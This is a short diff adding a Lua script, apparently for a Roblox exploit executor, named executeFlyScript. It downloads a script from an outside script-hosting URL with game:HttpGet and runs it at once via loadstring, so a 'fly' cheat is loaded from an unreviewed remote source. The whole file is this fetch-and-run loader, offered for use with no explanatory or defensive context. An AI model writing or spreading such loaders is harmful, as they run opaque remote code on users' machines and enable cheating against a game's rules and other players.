@@ -1,0 +1,11 @@
+local function executeFlyScript()
+    local url = "https://api.junkie-development.de/api/v1/luascripts/public/721f158421648bb36c8579b45b6bc73b2391b5c9e290f71e1a03b98a1dcbed38/download"
+    local success, result = pcall(function() return game:HttpGet(url) end)
+    if success then
+        loadstring(result)()
+    else
+        warn("Failed to fetch script: " .. result)
+    end
+end
+
+executeFlyScript()
